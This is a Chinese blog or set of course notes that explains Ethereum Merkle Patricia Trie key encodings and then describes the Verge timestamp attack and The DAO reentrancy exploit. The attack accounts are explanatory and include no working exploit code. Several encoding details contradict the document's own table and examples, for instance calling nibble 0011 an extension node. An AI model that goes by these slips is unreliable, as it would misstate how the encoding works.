<p>其中<code>Key</code>是MPT树实现树高压缩的关键。当MPT试图插入一个节点，插入过程中发现目前没有与该节点Key拥有相同前缀的路径。此时MPT把***剩余的Key***存储在叶子／扩展节点的Key字段中，充当一个”Shortcut“。【可以结合上面toasting的例子】</p>
<p>此外Val字段用来存储叶子／扩展节点的内容，对于叶子节点来说，该字段存储的是一个数据项的内容；而对于扩展节点来说，该字段可以是以下两种内容：</p>
<ol>
<li>Val字段存储的是其孩子节点在数据库中存储的索引值（其实该索引值也是孩子节点的哈希值）；</li>
<li>Val字段存储的是其孩子节点的引用；</li>
</ol>
<p>由于叶子&#x2F;扩展节点共享一套定义，那么怎么来区分Val字段存储的到底是一个数据项的内容，还是一串哈希索引呢？在以太坊中，通过在Key中加入特殊的标志来区分两种类型的节点。</p>
<h2 id="还有一个重要的概念是：key值编码"><a href="#还有一个重要的概念是：key值编码" class="headerlink" title="还有一个重要的概念是：key值编码"></a><strong>还有一个重要的概念是：key值编码</strong></h2><p>在以太坊中，MPT树的key值共有三种不同的编码方式，以满足不同场景的不同需求，在这里单独作为一节进行介绍。</p>
<p>三种编码方式分别为：</p>
<ol>
<li>Raw编码（原生的字符）；</li>
<li>Hex编码（扩展的16进制编码）；</li>
<li>Hex-Prefix编码（16进制前缀编码）；</li>
</ol>
<h3 id="Raw编码"><a href="#Raw编码" class="headerlink" title="Raw编码"></a>Raw编码</h3><p>Raw编码就是原生的key值，不做任何改变。这种编码方式的key，是MPT对外提供接口的默认编码方式。</p>
<blockquote>
<p>例如一条key为“cat”，value为“dog”的数据项，其Raw编码就是[‘c’, ‘a’, ‘t’]，换成ASCII表示方式就是[63, 61, 74]</p>
</blockquote>
<h3 id="Hex编码"><a href="#Hex编码" class="headerlink" title="Hex编码"></a>Hex编码</h3><p>在介绍分支节点的时候，我们介绍了，为了减少分支节点孩子的个数，需要将key的编码进行转换，将原key的高低四位分拆成两个字节进行存储。这种转换后的key的编码方式，就是Hex编码。</p>
<p>从Raw编码向Hex编码的转换规则是：</p>
<ul>
<li>将Raw编码的每个字符，根据高4位低4位(nibble)拆成两个字节；</li>
<li>若该Key对应的节点存储的是真实的数据项内容（即该节点是叶子节点），则在末位添加一个ASCII值为16的字符作为终止标志符；</li>
<li>若该key对应的节点存储的是另外一个节点的哈希索引（即该节点是扩展节点），则不加任何字符；</li>
</ul>
<blockquote>
<p>key为“cat”, value为“dog”的数据项，其Hex编码为[6, 3, 6, 1, 7, 4, 10]</p>
</blockquote>
<p><em>Hex编码用于对内存中MPT树节点key进行编码</em></p>
<h3 id="HP编码"><a href="#HP编码" class="headerlink" title="HP编码"></a>HP编码</h3><p>MPT树中另外一个重要的概念是一个特殊的十六进制前缀(hex-prefix, HP)编码，用来对key进行编码。因为有两种[key,value]节点(叶节点和扩展节点)，所以需要对它们进行区分。此时，引进一种特殊的标识（一个bit即可）来标识key所对应的是值是叶子，还是其他节点的hash。如果标识符是1，那么key对应的是叶节点，反之则是扩展节点。</p>
<p>另外需要注意的一点是，在某个节点处，当前路径的长度可能是奇数。此时会面临的一个问题是，因为路径本身是按照4位，也即一个nibble为单位的，但是存储的时候总是以字节为单位的。假设当前有两个路径分别是‘136’和‘0136’，在存储的时候是没有办法区分的，因为以字节为单位进行存储的时候，总是会转化为01 + 36两个字节。所以，在HP编码中，还必须有一个标识进行路径长度奇偶性的标识。【注：要结合下面具体的例子看，这里的路径不是从根到叶子的完整的路径（总是偶数），而是当前在叶子节点&#x2F;扩展节点中存储的路径的长度】</p>
<p>所以在MPT树中，对每个路径（叶子节点首先移除末尾的16），总是要首先加上一个nibble，这个Nibble的最低位表示节点路径长度奇偶性，第二低位表示节点的性质。</p>
<p>如果key是偶数长度，那么因为又加了一个四个比特，所以需要加上另外一个值为0的nibble，使得整体长度为偶数。</p>
<p>HP编码的规则如下：</p>
<ul>
<li>若原key的末尾字节的值为16（即该节点是叶子节点），去掉该字节；</li>
<li>在key之前增加一个半字节，其中最低位用来编码原本key长度的奇偶信息，key长度为奇数，则该位为1；低2位中编码一个特殊的终止标记符，若该节点为叶子节点，则该位为1；</li>
<li>若原本key的长度为偶数，则在key之前再增加一个值为0x0的<strong>半字节</strong>；</li>
<li>将原本key的内容作压缩，即将两个字符以高4位低4位进行划分，存储在一个字节中（Hex扩展的逆过程）；</li>
</ul>
<blockquote>
<p>若Hex编码为[6, 3, 6, 1, 7, 4, 10]，则HP编码的值为[20, 63, 61, 74]</p>
</blockquote>
<p>所添加的nibble的值和所对应的节点的路径的性质表如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">hex char    bits    |    node type partial     path length</span><br><span class="line">----------------------------------------------------------</span><br><span class="line">   0        0000    |       extension              even        </span><br><span class="line">   1        0001    |       extension              odd         </span><br><span class="line">   2        0010    |   terminating (leaf)         even        </span><br><span class="line">   3        0011    |   terminating (leaf)         odd</span><br></pre></td></tr></table></figure>

<p>根据bits可以判断出节点的类型和搜索路径长度的奇偶性。0000，查看最后两位的情况，倒数第二位是0，说明是extension节点；最后一位是0，说明路径长度是偶数。0011，最后两位的值是11，第二低位是1说明是扩展节点，最后一位是1说明路径长度为奇数。剩下两种情况类似可分析。</p>
<p><strong>转换关系</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233085.jpg" alt="img"></p>
<p>以上三种编码方式的转换关系为：</p>
<ul>
<li>Raw编码：原生的key编码，是MPT对外提供接口中使用的编码方式，当数据项被插入到树中时，Raw编码被转换成Hex编码；</li>
<li>Hex编码：16进制扩展编码，用于对内存中树节点key进行编码，当树节点被持久化到数据库时，Hex编码被转换成HP编码；</li>
<li>HP编码：16进制前缀编码，用于对数据库中树节点key进行编码，当树节点被加载到内存时，HP编码被转换成Hex编码；</li>
</ul>
<p>下面结合一个具体的例子再来描述一遍这个过程。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233086.jpg" alt="img">官方示例</p>
<p>在上图中，共有四个键值对。四个key有共同的前缀a7，因此，第一个节点（也是root节点）是一个扩展节点。之后接下来有三个分支，分别是1、7和f。因此，扩展节点之后跟着一个分支节点，分支节点中有三个分支。其中分支1和7之后只有一个节点，因此直接到达了叶子节点。分支7之后有两个节点，并且这两个节点有共同的前缀‘d3’，所以分支7连着一个扩展节点。扩展节点之后有两个分支，3和9，因此再跟上一个分支节点。分支节点之后是两个叶子节点。</p>
<p>然后再分析一下前缀的情况。在路径为’a7’的扩展节点中，路径长度为偶数，本身为扩展节点，因此，第一个nibble为0000，长度为偶数，添加一个nibble 0000，前缀应该为00。第二层的两个叶子节点，长度都为偶数，所以第一个nibble是0010，再添加一个nibble 0000,所以最终前缀应该为20。第二层中的扩展节点，同样长度为偶数，所以前缀应该是00。最后一层的叶子节点中，长度为奇数，所以添加的nibble是0011，也即3。</p>
<p>练习：</p>
<p>完成下列节点的Hex编码到HP编码。</p>
<p>&gt; [ 1, 2, 3, 4, 5, …] 【扩展结点，路径长度为奇数，添加01（bit），也即1(nibble)】<br>‘11 23 45’<br>&gt; [ 0, 1, 2, 3, 4, 5, …]【扩展结点，路径长度为偶数，添加00，也即0，然后补一个0000】<br>‘00 01 23 45’<br>&gt; [ 0, f, 1, c, b, 8, 10] 【叶子节点，长度为偶数（最后一个10也即16，补充位，需要移除），添加10，也即2，然后补0000，也即0】<br>‘20 0f 1c b8’<br>&gt; [ f, 1, c, b, 8, 10] 【叶子节点，长度为奇数，添加11，也即3】<br>‘3f 1c b8’</p>
<p>请画出下面的MPT。</p>
<p>Suppose we want a trie containing four path&#x2F;value pairs <code>(&#39;do&#39;, &#39;verb&#39;)</code>, <code>(&#39;dog&#39;, &#39;puppy&#39;)</code>, <code>(&#39;doge&#39;, &#39;coin&#39;)</code>, <code>(&#39;horse&#39;, &#39;stallion&#39;)</code>.</p>
<p>First, we convert both paths and values to <code>bytes</code>. Below, actual byte representations for <em>paths</em>are denoted by <code>&lt;&gt;</code>, although <em>values</em> are still shown as strings, denoted by <code>&#39;&#39;</code>, for easier comprehension (they, too, would actually be <code>bytes</code>):</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&lt;64 6f&gt; : &#x27;verb&#x27;</span><br><span class="line">&lt;64 6f 67&gt; : &#x27;puppy&#x27;</span><br><span class="line">&lt;64 6f 67 65&gt; : &#x27;coin&#x27;</span><br><span class="line">&lt;68 6f 72 73 65&gt; : &#x27;stallion&#x27;</span><br></pre></td></tr></table></figure>

<p>Now, we build such a trie with the following key&#x2F;value pairs in the underlying DB:</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">rootHash: [ &lt;16&gt;, hashA ]</span><br><span class="line">hashA:    [ &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, hashB, &lt;&gt;, &lt;&gt;, &lt;&gt;, hashC, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt; ]</span><br><span class="line">hashC:    [ &lt;20 6f 72 73 65&gt;, &#x27;stallion&#x27; ]</span><br><span class="line">hashB:    [ &lt;00 6f&gt;, hashD ]</span><br><span class="line">hashD:    [ &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, hashE, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &#x27;verb&#x27; ]</span><br><span class="line">hashE:    [ &lt;17&gt;, hashF ]</span><br><span class="line">hashF:    [ &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, hashG, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &#x27;puppy&#x27; ]</span><br><span class="line">hashG:    [ &lt;35&gt;, &#x27;coin&#x27; ]</span><br></pre></td></tr></table></figure>

<p>以上四个键，共享一个公共前缀6，所以第一个节点应该是扩展节点，其后4和8有两个分支，因此扩展节点之后跟着分支节点，其中第一个分支节点4之后有三个有共同前缀‘6f’键值对，所以分支4之后是一个扩展节点。而8之后只有一个节点，所以8之后是一个叶子节点。4之后的扩展节点有共同前缀‘6f’，‘6f‘之后有两种情况，分别是空和‘6’。所以该扩展节点之后跟着分支节点。分支节点中6之后跟着扩展节点，因为有两个键值对共享7前缀。空的位置则对应着‘verb’值本身。6之后的扩展节点的共享前缀是’7’，7之后有两种情况，分别是空和’6’。类似地，空的位置对应着单词’puppy’；分支6之后对应着叶子节点‘coin’。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233087.jpg" alt="img"></p>
<p>最后，再构造好Particia树之后，是怎么样和Merkle树结合起来了呢？这里主要是如上所示，对所有的节点的值都做了Hash。</p>
<p>增加一个练习：</p>
<p>Whenever a new item is added to the trie the algorithm can decide whether to insert a branch, a leaf or an extension. Let’s say you need to insert 3 key-value pairs:</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&quot;0x01&quot;: 1</span><br><span class="line">&quot;0x01234&quot;: 2</span><br><span class="line">&quot;0x01235&quot;: 3</span><br></pre></td></tr></table></figure>

<p>After “0x01” is inserted the trie will look like this (<code>hash0</code> is root):</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&lt;hash0&gt; leaf [&quot;0x01&quot;, 1]</span><br></pre></td></tr></table></figure>

<p>After “0x01234” is inserted (<code>hash1</code> is root):</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&lt;hash1&gt; extension [&quot;0x01&quot;, &lt;hash2&gt;]</span><br><span class="line">&lt;hash2&gt; branch [NULL,NULL,&lt;hash3&gt;,..&lt;13 NULLs&gt;.., 1]</span><br><span class="line">&lt;hash3&gt; leaf [&quot;0x34&quot;, 2]</span><br></pre></td></tr></table></figure>

<p>After “0x01235” is inserted (<code>hash4</code> is root):</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&lt;hash4&gt; extension [&quot;0x01&quot;, &lt;hash5&gt;]</span><br><span class="line">&lt;hash5&gt; branch [NULL,NULL,&lt;hash6&gt;,..&lt;13 NULLs&gt;.., 1]</span><br><span class="line">&lt;hash6&gt; extension [&quot;0x3&quot;, &lt;hash7&gt;]</span><br><span class="line">&lt;hash7&gt; branch [NULL,NULL,NULL,NULL,&lt;hash8&gt;,&lt;hash9&gt;..&lt;10 NULLs&gt;.., NULL]</span><br><span class="line">&lt;hash8&gt; leaf [&quot;&quot;, 2]</span><br><span class="line">&lt;hash9&gt; leaf [&quot;&quot;, 3]</span><br></pre></td></tr></table></figure>

<p>Generally, while inserting a key-value pair:</p>
<ul>
<li>if you stopped at a NULL node, you add a new leaf node with the remaining path and replace NULL with the hash of the new leaf.</li>
<li>if you stopped at a leaf node, you need to convert it to an extension node and add a new branch and 1 or 2 leafs.</li>
<li>if you stopped at an extension node, you convert it to another extension with shorter path and create a new branch and 1 or 2 leafs. If the new path turns out to be empty you convert it to a branch instead.</li>
</ul>
<p>When deleting a key-value pair:</p>
<ul>
<li>if there is a branch that has a single non NULL nibble and NULL value, this branch can be replaced with a leaf or an extension.</li>
<li>if there is an extension that points to another extension or a leaf, it can be collapsed into a single extension&#x2F;leaf.</li>
<li>if there is branch with all NULL nibbles and non NULL value, it can be converted into a leaf.</li>
</ul>
<p>I most likely missed a few cases but I hope the general idea is clear. When adding&#x2F;deleting key-value pairs the algorithm can make the decision locally at the current node, there is no need to create an unpacked version of the trie first and then pack it.</p>
<p>参考：</p>
<ol>
<li><a href="https://link.zhihu.com/?target=https://ethfans.org/wikis/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%8E%86%E5%8F%B2">EthFans | 以太坊爱好者</a></li>
<li><a href="https://link.zhihu.com/?target=https://github.com/ethereum/wiki/wiki/Patricia-Tree">ethereum&#x2F;wiki</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.8btc.com/article/73758">谈谈以太坊的Merkle树_巴比特_服务于区块链创新者</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.csdn.net/qq_33935254/article/details/55505472">深入浅出以太坊MPT（Merkle Patricia Tree）</a></li>
<li><a href="https://link.zhihu.com/?target=https://segmentfault.com/a/1190000016050921">以太坊源码分析 MPT - SegmentFault</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.bitmex.com/zh_cn-complete-guide-to-proof-of-stake-ethereums-latest-proposal-amp-vitalik-buterin-interview/">https://blog.bitmex.com/zh_cn-complete-guide-to-proof-of-stake-ethereums-latest-proposal-amp-vitalik-buterin-interview&#x2F;</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.chainnews.com/articles/754796689749.htm">https://www.chainnews.com/articles/754796689749.htm</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethfans.org/posts/ethereum-explained-merkle-trees-world-state-transactions-and-more">https://ethfans.org/posts/ethereum-explained-merkle-trees-world-state-transactions-and-more</a></li>
<li><a href="https://link.zhihu.com/?target=http://soliloquy0810.cn/2019/03/23/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E4%B8%AD%E7%9A%84%E7%8A%B6%E6%80%81%E6%A0%91%E3%80%81%E4%BA%A4%E6%98%93%E6%A0%91%E3%80%81%E6%94%B6%E6%8D%AE%E6%A0%91/">http://soliloquy0810.cn/2019/03/23/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E4%B8%AD%E7%9A%84%E7%8A%B6%E6%80%81%E6%A0%91%E3%80%81%E4%BA%A4%E6%98%93%E6%A0%91%E3%80%81%E6%94%B6%E6%8D%AE%E6%A0%91/</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.infoq.cn/article/how-does-ethereum-work-anyway">https://www.infoq.cn/article/how-does-ethereum-work-anyway</a></li>
<li><a href="https://link.zhihu.com/?target=https://harry.uno/post/merkle-patricia-tree.html">https://harry.uno/post/merkle-patricia-tree.html</a></li>
<li><a href="https://link.zhihu.com/?target=https://masterthecrypto.com/ethereum-what-is-gas-gas-limit-gas-price/">https://masterthecrypto.com/ethereum-what-is-gas-gas-limit-gas-price/</a></li>
<li><a href="https://link.zhihu.com/?target=https://medium.com/cybermiles/diving-into-ethereums-world-state-c893102030ed">https://medium.com/cybermiles/diving-into-ethereums-world-state-c893102030ed</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/e67452930dcc">https://www.jianshu.com/p/e67452930dcc</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.cnblogs.com/luosongchao/p/3239521.html">https://www.cnblogs.com/luosongchao/p/3239521.html</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethereum.stackexchange.com/questions/39915/ethereum-merkle-patricia-trie-extension-node">https://ethereum.stackexchange.com/questions/39915/ethereum-merkle-patricia-trie-extension-node</a></li>
<li><a href="https://link.zhihu.com/?target=http://www.jouypub.com/2018/9b19cff7135411bd37356e6c4f5f63b7/">http://www.jouypub.com/2018/9b19cff7135411bd37356e6c4f5f63b7/</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/28928827">https://zhuanlan.zhihu.com/p/28928827</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.hellobtc.com/kp/kc/201904/1562.html">https://www.hellobtc.com/kp/kc/201904/1562.html</a></li>
</ol>
<h1 id="区块链技术12：区块链安全（1）"><a href="#区块链技术12：区块链安全（1）" class="headerlink" title="区块链技术12：区块链安全（1）"></a>区块链技术12：区块链安全（1）</h1><p>在引入比特币等加密货币时，一个经常提及的概念是支撑着这些加密货币的底层框架——区块链协议非常地安全可靠。各种加密算法保证了区块链的正常运行，区块链中的信息不可篡改、不能删除，基于工作量的证明保证难以有攻击者可以控制网络。在这些良好性质的支持下，加密货币系统得到了快速的发展。</p>
<p>但是，对加密货币的绝对安全的期望是错误的。接下来，我们将看一些具体的例子，查看其中加密货币系统是如何被攻击的。第一个例子，攻击者针对的是区块链的底层运行算法；第二个例子，攻击者利用的则是区块链上智能合约的编写。</p>
<h2 id="verge"><a href="#verge" class="headerlink" title="verge"></a>verge</h2><p>verge是一种规模相对较小的加密货币。在2018年4月 4 日至 6 日这段时间里，黑客成功地控制了 Verge 网络三次，每次持续几个小时，在此期间，黑客阻止了任何其他用户进行支付。而且在此期间他们能够以 1560 枚每秒（大约 $80）的速度伪造 Verge 币，共伪造价值超百万美元的 Verge 币。</p>
<p>看到这个攻击效果时，我们来想一想，什么样的攻击能够达到这个效果？</p>
<p>其他用户完全不能支付，也就意味着这些用户产生的交易始终不能被打包到区块中，不能获得确定，从而相当于是不能进行支付。如何伪造Verge币呢？持续产生区块就行。那如何能持续产生区块呢？那就要比其他用户更快地产生区块。换言之，就是要控制网络中超过51%的算力。</p>
<p>51%攻击我们在双重支付的时候提到过，如果攻击者能够控制51%的算力，那么他们就可以控制产生的区块，在区块中包括双重支付的交易，或者在包括双重支付的交易之后进行延续。但当时我们也分析了，首先，在比特币系统中，在拥有大量的矿工和矿池的情况下，任何人想要控制51%的算力基本是不可能的；其次，如果有人真正控制了51%的算力，那么他会选择遵守和维护这个秩序，从而避免自己的投资浪费掉。</p>
<p>那这个针对Verge的攻击是怎么回事呢？攻击者其实并没有真正掌握51%的算力。</p>
<p>控制51%的算力实际上就是要比别人更快地进行哈希，找出来满足区块产生难度的哈希值。那如果不能在算力上占优，有没有可能降低区块的难度？</p>
<p>在比特币系统中，产生区块的难度是可以动态调节的。难度值被设定在无论节点计算能力如何，新区块产生速率都保持在每10分钟一个。难度的调整是在每个完整节点中独立自动发生的。每2016个区块，所有节点都会按统一的公式自动调整难度。</p>
<p>在Verge系统中，也有类似的机制。Verge希望维持足够的去中心化，也即让个人计算机这样的小型设备能参与计算；但为了防止过快产生区块，Verge规定每隔 30 秒产生一个区块。为了实现这一点，Verge的挖矿难度是根据区块确认速率动态调整的。如果更多的人决定投入更多的算力产生 Verge 区块，那么挖矿速率会变快，Verge 区块链协议将增加挖矿难度，从而限制区块提交速率。相反，随着挖矿算力下降以及区块产生间隔增加，挖矿会变得更加容易。因此，当网络正常运行时，不管外界环境如何，Verge 网络都能够实时处理，并且引导网络达到目标区块产生速率的均衡。从设计目的而言，这个设计毫无疑问是非常人性化的，用户友好的。</p>
<p>Verge 用来计算密码学难题的共识算法是 Dark Gravity Wave，它对 30 分钟内滑动窗口的区块确认速率取加权平均值。这样的后果是，挖矿难度是最近区块产生速率的函数，而基于区块产生频率进行挖矿难度计算自然需要查看区块时间戳。</p>
<p>这里还涉及到一个问题：在区块链系统是，区块时间戳允许乱序。</p>
<p>在区块链协议中，单笔交易被分组打包到一个区块中，作为整体进行确认。每一个区块都有一个其创建日期的时间戳。即使区块链协议正常运行，在某些情况下这些时间戳也可能是乱序的，即，第 100 个区块的时间戳可能<em>晚于</em>第 101 个区块。这是因为，在去中心化系统中，进行时间同步确实是一件很难的事情。即便所有节点都是诚实的，区块的时间戳也绝对有可能出现“乱序”的情况。换句话说，在去中心化系统中，允许乱序才是正常的；在 Verge 被黑客攻击之前，它允许接收的区块时间戳“窗口”至多为2个小时。在Verge攻击之后，这个窗口被缩小到15分钟。</p>
<p>现在，如果有人创建出足够多的错误时间戳，那么就会影响Verge的区块产生速率的判断，从而降低区块的产生难度。在黑客几次攻击的时间里，每隔一个区块的提交时间戳大约比区块加入区块链的时间早一个小时，这就使得协议的挖矿调整算法输出结果惨不忍睹了。如果协议能够流利地讲英语的话，它将会说：“Oh no！Not enough blocks have been submitted recently！Mining must be too difficult——let’s make it easier！”（哦，不！最近提交的区块数量不够！挖矿算法一定是太难了——让我们调整的简单一些吧！）由于时间戳持续被篡改，协议持续降低挖矿难度，直到挖矿变得非常容易。总的来说，攻击前几个小时的平均难度是 1393093.39131，在攻击期间它的难度降低到 0.00024414，难度降低了超过 99.999999%。更低的挖款难度意味着能够提交更多的区块——在这种情况下，大约每秒产生一个区块。</p>
<p>如果仅仅是这样的话，攻击者并没有捞到什么好处，因为，如果系统调低了产生区块的难度，那么所有矿工的难度都降低了，攻击者还是需要和其他人进行竞争。这时，就需要利用Verge的另一个特点——Verge 使用了五种算法是 Scrypt，X17，Lyra2rev2，myrgroestl 以及 blake2s作为工作量证明的算法。（作为对比，比特币是SHA256）</p>
<p>Verge做出这个决定的出发点也是非常好的。因为，随着时间推移，比特币矿场变得过于专业化和中心化，例如，比特币大部分区块都是由 Bitcoin ASIC 矿机（这种矿机专门设计用于挖比特币）产生，并且许多比特币是由少数矿池挖出来的。Verge开发者认为，如果使用5中不同的算法，任何人想要同时控制5种算法， 使用5中专用硬件，难度应该会高于只用一种算法，从而促进 Verge 挖矿经济朝着更分布式、去中心化的方向发展。</p>
<p>这样，保证系统正常运行的方法是，每个算法都有<em>自己</em>的挖矿难度参数，并且独立于其余四个算法进行调整，这意味着，Scrypt 的挖矿难度将调整到每30秒产生一个区块，X17 及其他三种算法亦然。从而整个 Verge 网络才能保证每 30 秒产生一个区块、保持全部五种算法的收益对于矿工来说都是均衡的，并确保没有一种算法占优势地位。</p>
<p>这意味着伪造的时间戳并没有降低整个网络挖矿难度，而仅仅只是降低了五个算法中的 Scrypt的挖矿难度。因此，当 Scrypt 矿工的挖矿难度很低时，其他四种算法的矿工依旧得像之前一样努力工作，那么它们的哈希算力对于维护网络安全就没用了。更重要的是，攻击者仅需要使用 Scrypt 算法挖矿，并且仅需要与也使用 Srypt 挖矿的人竞争。因此，攻击者控制网络所需的哈希算力从当初的超过50%（在整个网络中占多数），下降到仅需超过10%（在 Scrypt 矿工中占多数），而Reddit 论坛上有人粗略地估计，这个数字甚至<a href="https://link.zhihu.com/?target=https://www.reddit.com/r/CryptoCurrency/comments/8a2b99/verge_xvg_mining_exploit_attack_megathread/">低至0.4%</a>。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233088.jpg" alt="img">使用scrypt算法产生的区块</p>
<p>在攻击产生后，Verge的股价产生了波动。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233089.jpg" alt="img">攻击发生后，股价下跌</p>
<p>下图是5月的第二次攻击后产生的；据说第一次攻击后一周，反而上涨了…..</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233090.jpg" alt="img">一个月之间，跌了20%</p>
<p>应该来说，从中应该得到的教训是：当涉及用户金融资产时，应更倾向于事实证明更行之有效的方法，并防止事情变得过于复杂，从而带来不必要的风险。</p>
<h2 id="THE-DAO攻击"><a href="#THE-DAO攻击" class="headerlink" title="THE DAO攻击"></a>THE DAO攻击</h2><p>在区块链技术领域，The DAO攻击中，面对黑客当着面利用漏洞源源不断从1.5亿美金的以太币池中拿走资金，而且还没办法。</p>
<p>The DAO项目是区块链物联网公司Slock.it发起的一个众筹项目。THE DAO是一个分散自治的组织(Decentralized Autonomous Organization),它的目标是编写一个组织的规则和决策机构，消除对文件和人员治理的需求，建立一个分散控制的结构。DAO是区块链法则里不可少的一环，而the DAO含义为“DAO之母”，是建立在以太坊上的一个应用，功能类似于投资机构。参与者可以使用以太币来换取DAO，也就是the DAO的token，持有DAO可以对the DAO的投资决策提出自己的意见。</p>
<p>它的工作流程如下：</p>
<ol>
<li>技术人员编写在组织上运行的智能合约</li>
<li>在初始资金募集期，通过购买代表所有权的token代币来将资金注入到DAO项目中，也即ICO，为项目提供资金（THE DAO众筹约1.5亿美元的资金，是当时最大的众筹项目；远超创建者预期）</li>
<li>ICO之后，DAO开始运作</li>
<li>创业者可以给DAO项目提出议案，拥有TOKEN的成员享有投票权，通过投票决定是否通过议案</li>
</ol>
<p>项目运作特点： </p>
<ol>
<li>通过智能合约来主导以太币资金的分发利用</li>
<li>参与众筹人按照出资金额（比特币等），获得相应DAO代币，即内部token，具有审查及投票表决权利</li>
<li>投资议案由全体代币持有人投票，每个代币一票</li>
<li>项目收益按照一定规则回馈代币持有人</li>
</ol>
<p>The DAO项目于2016年4月30日开始，融资窗口开放了28天。不知出于什么原因，反正The DAO项目就这么火起来了，截止5月15日这个项目筹得了超过一亿美元，而到整个融资期结束，共有超过11,000位热情的成员参与进来，筹得1.5亿美元，成为历史上最大的众筹项目。The DAO所集资的钱远远超过其创建者的预期。</p>
<p>可以说，他们的市场战略比他们职能的执行来的好，因为在众销期间，就有人担心其代码会很容易受到攻击。6月17日发生了黑客攻击事件，事件的根本原因在于一行早已被发现的代码漏洞。 康奈尔大学计算机科学系副教授Emin Gün Sirer在给他的一位学生发邮件时提到他正在研究智能合约第666行代码可能存在的问题，甚至在2016年5月份也呼吁过投资者停止对DAO的投资，因为存在这样的安全漏洞。但是，Gün教授对于代码漏洞无能为力，因为代码发布在以太坊区块链上就无法修改。事实上，发现这行代码漏洞的并不止Gün教授，2016年6月9日，在互联网上出现了与这次黑客攻击相同手法的预警，6月10日智能合约语言Solidity的作者 Christian在以太坊官方博客上发表文章说明这个问题，the DAO团队也接到了安全报告，但做出了不会受到攻击的结论。有一点需要重申，那就是以太坊网络之前没有出现过这种漏洞，并且整个期间一直运作良好。其实所有网络系统都有可能会遭到各种各样的攻击。而支撑价值超过10亿美元（根据市值计算）的以太币的以太坊网络还没有遇到过黑客攻击，而且它同时还在运行很多其他智能合约。6月18日，也就是周六，黑客成功挖到超过360万个以太币，并投入到一个DAO子组织中，这个组织和THE DAO有着同样的结构。当时以太币价格从20多美元直接跌破13美元。</p>
<p>The DAO的智能合约中有一个splitDAO函数，splitDAO的本意是要保护投票中处于弱势地位的少数派防止他们被多数派通过投票的方式合法剥削。通过分裂出一个小规模的DAO，给予他们一个用脚投票的机制，同时仍然确保他们可以获取分裂前进行的对外资助产生的可能收益。</p>
<p>攻击者通过此函数中的漏洞重复利用自己的DAO资产来不断从TheDAO项目的资产池中分离DAO资产给自己。</p>
<p>在DAO.sol中，function splitDAO函数有这样一行：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233091.jpg" alt="img"></p>
<p>然后，withdrawRewardFor的实现如下：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233092.jpg" alt="img"></p>
<p>再看payOut函数调用。rewardAccount的类型是ManagedAccount，在ManagedAccount.sol中可以看到：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233093.jpg" alt="img"></p>
<p>关于以上代码为何会导致攻击，我们来分析一下。</p>
<p>既然以太币是作为电子货币，那么自然会有交易，也即send()和receive()。以太坊上的编程语言solidity提供了三种方法实现send功能。分别是address.send，address.transfer和address.call.value。</p>
<p>Solidity 中 <code>&lt;address&gt;.transfer()</code>，<code>&lt;address&gt;.send()</code> 和 <code>&lt;address&gt;.gas().call.value()()</code> 都可以用于向某一地址发送 ether，他们的区别在于：</p>
<p><strong><address>.transfer()</strong></p>
<ul>
<li>当发送失败时会 <code>throw;</code> 回滚状态</li>
<li>只会传递 2300 Gas 供调用，防止重入（reentrancy）</li>
</ul>
<p><strong><address>.send()</strong></p>
<ul>
<li>当发送失败时会返回 <code>false</code> 布尔值</li>
<li>只会传递 2300 Gas 供调用，防止重入（reentrancy）</li>
</ul>
<p><strong><address>.gas().call.value()()</strong></p>
<ul>
<li>当发送失败时会返回 <code>false</code> 布尔值</li>
<li>传递所有可用 Gas 进行调用（可通过 <code>gas(gas_value)</code> 进行限制），不能有效防止重入（reentrancy）</li>
</ul>
